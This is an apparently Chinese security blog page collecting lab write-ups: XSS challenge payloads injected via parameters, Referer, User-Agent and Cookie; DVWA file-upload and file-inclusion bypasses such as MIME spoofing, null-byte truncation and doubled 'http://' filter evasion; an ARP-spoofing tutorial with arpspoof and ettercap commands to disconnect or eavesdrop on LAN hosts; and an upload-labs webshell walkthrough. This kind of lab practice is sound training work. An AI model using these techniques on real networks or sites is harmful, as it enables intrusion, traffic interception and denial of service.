<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="'</span><span class="token punctuation">.</span><span class="token variable">$str7</span><span class="token punctuation">.</span><span class="token string">'">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>多了判读语句，必须要含有http：//才行</p>
<p>#代码利用</p>
<pre><code>javasc&amp;#82;ipt:alert(&#39;http://xss&#39;)</code></pre>
<h5 id="0x0A-1"><a href="#0x0A-1" class="headerlink" title="#0x0A"></a>#0x0A</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$str11</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str33.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span></code></pre>
<p>这里回显的是t_sort，所以需要直接构造</p>
<p>#代码利用</p>
<pre><code>&amp;t_sort=click me!&quot; type=&quot;button&quot; onclick=&quot;alert(1)</code></pre>
<h5 id="0x0B-1"><a href="#0x0B-1" class="headerlink" title="#0x0B"></a>#0x0B</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>回显的内容是http请求包的referer部分，用burp截包修改referer部分</p>
<p>#代码利用</p>
<pre><code>referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></pre>
<h5 id="0x0C-1"><a href="#0x0C-1" class="headerlink" title="#0x0C"></a>#0x0C</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<p>修改User-Agent</p>
<p>#代码利用</p>
<pre><code>&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></pre>
<h5 id="0x0D-1"><a href="#0x0D-1" class="headerlink" title="#0x0D"></a>#0x0D</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<p>修改Cookie</p>
<p>#代码利用</p>
<pre><code>&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></pre>
<h5 id="0x0E"><a href="#0x0E" class="headerlink" title="#0x0E"></a>#0x0E</h5><p>不能进行测试</p>
<h5 id="0x0F-1"><a href="#0x0F-1" class="headerlink" title="#0x0F"></a>#0x0F</h5>
        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/01/04/DVWA/">
                DVWA
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-01-04</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>①Low</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span>
     <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span><span class="token punctuation">.</span><span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>       
     <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                 </span>
         <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>         
         <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>         
         <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
     <span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;               </span>
         <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>         
         <span class="token keyword">echo</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token string">' succesfully uploaded!'</span><span class="token punctuation">;</span>         
         <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>               
     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
<span class="token delimiter">?></span> </code></pre>
<p>从源码里可以看出对上传的文件没有做任何的检测。所以可以直接上传webshell。</p>
<p>②Medium</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span>
         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span><span class="token punctuation">.</span><span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>       
         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;          if(!move_uploaded_file($_FILES[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                   </span>
             <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
             <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>           
             <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
      <span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                   </span>
            <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
            <span class="token keyword">echo</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token string">' succesfully uploaded!'</span><span class="token punctuation">;</span>           
            <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                     
           <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;       </span>
       <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;       </span>
      <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;         </span>
            <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Your image was not uploaded.&lt;/pre>'</span><span class="token punctuation">;</span>       
          <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
<span class="token delimiter">?></span> </code></pre>
<p>从源码中可以看见，通过$_FILES来获取上传文件的名字，类型，大小。如果文件类型和大小符合要求就可以上传。</p>
<p>所以可以用burp进行拦截修改Connect-Type 为 image/jpeg  即可上传成功webshell。</p>
<p>③High</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> 
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span>
         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span><span class="token punctuation">.</span><span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>       
         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"jpg"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"JPG"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"jpeg"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_ext</span> <span class="token operator">==</span> <span class="token string">"JPEG"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;          </span>
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                                        echo </span><span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
                 <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>           
                 <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
             <span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                   </span>
                 <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
                 <span class="token keyword">echo</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token string">' succesfully uploaded!'</span><span class="token punctuation">;</span>          
                 <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                     
             <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;       </span>
         <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;             </span>
         <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                 </span>
             <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>         
             <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>         
             <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>       
         <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
<span class="token delimiter">?></span> </code></pre>
<p>从源码可以看出，这次是对后缀进行检测，是jpg格式的文件才能上传。</p>
<p>这里可以利用00截断进行绕过，在burp里拦截请求包，把fox.php改成fox.php.jpg。然后转成Hex显示格式，找到对应的这一行把.对应的2e 改成 00。然后发送请求包，就可成功绕过。</p>
<p>注：这里php的版本必须是5.5以下。</p>
<h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>文件包含分为LFI(Local File Inclusion)本地文件包含和RFI(Remote File Inclusion)远程文件包含。</p>
<p>注：一般网站都不会开放远程文件包含，因为太危险了。</p>
<p>①Low</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//The page we wish to display </span>
 <span class="token delimiter">?></span> </code></pre>
<p>对包含的文件没有做任何的限制，所以可以读取些敏感目录如：/etc/passwd</p>
<p>可以结合文件上传漏洞，先在文件上传漏洞那上传一张图片马，然后利用文件包含漏洞进行解析，上传webshell。</p>
<p>②Medium</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// The page we wish to display    // Bad input validation   </span>
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//", "", $file);   </span>
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>"https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//", "", $file);     </span>
 <span class="token delimiter">?></span> </code></pre>
<p>这里本地包含没有问题，但是把http://和https://替换成空。看似不能进行远程包含，但和SQL注入绕过一样，进行叠加即可绕过。</p>
<p>#example:  httphttp://://x.x.x/1.txt</p>
<p>可以用自己的kali来当另一台服务器角色，在kali里启动apache服务，在物理机上进行访问(访问kali的ip，可以访问到apache的页面，什么也没有)，然后在var/www/html下随便写个文件保存。再在物理机上如果可以访问到就没问题。再去靶场进行远程文件包含。</p>
<p>注：</p>
<p>在php.ini中，allow_url_include 和allow_url_upload都要设为On。</p>
<p>①High</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>       
 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//The page we wish to display    // Only allow include.php   </span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"include.php"</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;     </span>
 <span class="token keyword">echo</span> <span class="token string">"ERROR: File not found!"</span><span class="token punctuation">;</span>     
 exit<span class="token punctuation">;</span>   <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
 <span class="token delimiter">?></span> </code></pre>
<p>这里就是限制的很死，只能包含include.php。这样写，就像铁桶保护一样，但是灵活性很差。后期修改代码，维护比较不方便。</p>
<p>##如果有大佬可以绕过这个High，可以联系作者有偿！</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2020/12/28/ARP%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/">
                ARP欺骗实验
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2020-12-28</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="这次实验的目的是对局域网内其他设备进行断网操作，及者监听操作。"><a href="#这次实验的目的是对局域网内其他设备进行断网操作，及者监听操作。" class="headerlink" title="这次实验的目的是对局域网内其他设备进行断网操作，及者监听操作。"></a>这次实验的目的是对局域网内其他设备进行断网操作，及者监听操作。</h3><h4 id="简单分析下ARP协议"><a href="#简单分析下ARP协议" class="headerlink" title="简单分析下ARP协议"></a>简单分析下ARP协议</h4><p>ARP(Address Resolution Protocol)地址解析协议，是根据IP地址获取其物理地址/MAC地址(硬件地址)的一个TCP/IP协议。它的作用是让局域网内的设备可以正常互相通信。地址解析协议是建立在网络中各个主机互相信任的基础上的。<u><em>所以存在一个缺点</em></u>，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗(ARPspoofing)。</p>
<h4 id="局域网内两台设备如何通信的呢？"><a href="#局域网内两台设备如何通信的呢？" class="headerlink" title="局域网内两台设备如何通信的呢？"></a>局域网内两台设备如何通信的呢？</h4><p>局域网间的两台设备进行通信不是通过IP地址，而是通过MAC地址。</p>
<p>局域网内有3台设备A,B,C。A的IP地址为192.168.1.1，MAC地址为01-01-01-01-01-01。B的IP地址为192.168.1.2，MAC地址为02-02-02-02-02-02。如果知道了对方的MAC地址（MAC地址就像是身份证，IP地址就像是姓名，名字一样的人很多，但身份证是唯一的），就可以进行通信了。如果不知道对方的MAC地址怎么办呢？</p>
<p>之时A会发送一个ARP请求报文，里面包括了源IP地址(A的IP)，源MAC地址。目的IP地址(B的IP)，目的MAC地址(但此时不知道对方的MAC地址，就会设为广播地址FF-FF-FF-FF-FF-FF)。发送给交换机，交换机进行局域网内的广播，这个IP地址是谁的，C看到发现不是自己的IP地址就会丢弃掉，B发现是自己的就会接收，并把自己的MAC地址应答回去。此时应答就不是广播，而是单播。把ARP应答报文发送给交换机，交换机再转发给A。这样A的ARP缓存表里就有B的MAC地址。</p>
<h4 id="ARP欺骗-中间人攻击中的一种-怎么实现呢？"><a href="#ARP欺骗-中间人攻击中的一种-怎么实现呢？" class="headerlink" title="ARP欺骗(中间人攻击中的一种)怎么实现呢？"></a>ARP欺骗(中间人攻击中的一种)怎么实现呢？</h4><p>发现A和B进行通信时，有个中间人进行转发就是交换机。而ARP有个缺点，就是不会检测报文的真实性就会接收。</p>
<p>假如C要知道A和B之间在干啥怎么办呢？C可以发送一个应答报文给A(IP为交换机的IP，MAC地址为C的ACK地址)。这时A就会认为，C是转发人员，把传给B的信息传给C，C可以先把信息内容存起来再转发给B。对B也进行同样的操作，就可以知道A和B之间在干啥了，达到了窃听的效果。</p>
<p>断网就是给A一个假的MAC地址，进行重定性。这样A就上网不了。当然断网没有意思，ARP欺骗主要是用来监听，挂马等操作。</p>
<h4 id="如何进行断网、监听操作呢？"><a href="#如何进行断网、监听操作呢？" class="headerlink" title="如何进行断网、监听操作呢？"></a>如何进行断网、监听操作呢？</h4><p><u><em>前提：须在同一个局域网下，知道对方的IP。</em></u></p>
<p>使用kali作为攻击机。网络连接模式设为桥接模式。</p>
<p>先ifconfig查询自己的网段(192.168.1.  )及网卡信息(例如 eth0)</p>
<p>使用nmap扫描出，同网段下存活的主机IP。</p>
<p>在kali终端输入 route -n 可以查询网关</p>
<h4 id="为啥要查询网关呢？"><a href="#为啥要查询网关呢？" class="headerlink" title="为啥要查询网关呢？"></a>为啥要查询网关呢？</h4><p>一台局域网下的机子，如何访问外网的资源呢？如图</p>
<p><img src="/images/11.png"></p>
<p>会先经过交换机，再经过网关，由网关向外界发送信息，最后再原路返回。</p>
<p>断网操作，骗取机子网关的MAC地址是你的MAC地址，或者是不存在的MAC地址。让数据包走势如图</p>
<p><img src="/images/12.png"></p>
<p>输入 arpspoof -i eth0 -t 目标IP   网关</p>
<p>这样受害机子，就永远发不出包，也就收不到应答包。就上不了网。</p>
<p>监听，让对方能正常上网。但在网站上操作的数据会被你窃取走。</p>
<p>#需先打开IP转发功能。kali默认是关闭的。执行以下命令开启IP转发功能</p>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p>
<p>再进行以下操作</p>
<p>arpspoof -i eth0 -t 目标IP   网关</p>
<p>ettercap -Tq -i eth0</p>
<p>就可开启对目标机子的监听了。</p>
<h4 id="最后再附上两张图帮助ARP工作原理，欺骗原理。"><a href="#最后再附上两张图帮助ARP工作原理，欺骗原理。" class="headerlink" title="最后再附上两张图帮助ARP工作原理，欺骗原理。"></a>最后再附上两张图帮助ARP工作原理，欺骗原理。</h4><p><img src="/images/9.png"></p>
<p><img src="/images/10.png"></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2020/12/22/Uplaod-labs/">
                Uplaod-labs
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2020-12-22</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>   环境</p>
<p>apache2.4</p>
<p>php5.2 和 php7.3 （有些关需要版本不一样）</p>
<p>webshell 菜刀 （蚁剑低版本php不懂啥原因连不上）       </p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="#0x01"></a>#0x01</h3><p>先上传一个fox.php的木马文件，发现被拦截下来<u><em>该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php</em></u>。尝试挂burp修改http请求包。</p>
<p>发现并没有流量产生就被拦截下来，所以应该是在前端就对文件格式进行了验证。</p>
<p>按F12调出开发者模式。搜索form</p>
<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>return checkFile()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>请选择要上传的图片：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>input_file<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload_file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上传<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span></code></pre>
<p>看到这里有个触发事件onsubmit=”return checkFile()” 点击提交就会触发，发现会返回checkFile()函数最后return的内容来验证。</p>
<p> 在《script type=”text/javascript”》发现checkFile函数对上传文件进行了后缀名的验证。</p>
<pre class=" language-php"><code class="language-php">  <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
